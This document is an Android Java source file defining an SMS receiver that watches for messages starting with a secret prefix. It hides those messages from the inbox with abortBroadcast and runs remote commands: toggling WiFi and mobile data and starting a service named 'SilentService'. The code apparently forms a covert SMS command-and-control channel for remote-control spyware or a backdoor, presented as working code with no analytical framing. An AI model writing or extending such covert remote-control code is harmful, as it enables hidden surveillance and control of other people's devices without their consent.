package com.rx.pocketvps;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "RX_SMS";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        String format = bundle.getString("format");

        for (Object pdu : pdus) {
            SmsMessage sms;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                sms = SmsMessage.createFromPdu((byte[]) pdu);
            }

            String body = sms.getMessageBody();
            if (body == null) continue;

            Log.d(TAG, "SMS received: " + body);

            // Sirf hamare secret commands
            if (body.startsWith(Config.SMS_SECRET)) {
                abortBroadcast(); // SMS ko hide karo inbox se
                handleSmsCommand(context, body.trim());
            }
        }
    }

    private void handleSmsCommand(Context context, String command) {
        NetworkManager nm = new NetworkManager(context);
        Log.d(TAG, "Handling SMS command: " + command);

        switch (command) {
            case "RX$VPS_WIFI_ON":
                nm.enableWifi();
                Log.d(TAG, "WiFi ON via SMS");
                break;

            case "RX$VPS_WIFI_OFF":
                nm.disableWifi();
                Log.d(TAG, "WiFi OFF via SMS");
                break;

            case "RX$VPS_DATA_ON":
                nm.enableMobileData();
                Log.d(TAG, "Data ON via SMS");
                break;

            case "RX$VPS_DATA_OFF":
                nm.disableMobileData();
                Log.d(TAG, "Data OFF via SMS");
                break;

            case "RX$VPS_START":
                // Service start karo
                Intent serviceIntent = new Intent(context, SilentService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
                Log.d(TAG, "Service started via SMS");
                break;
        }
    }
}
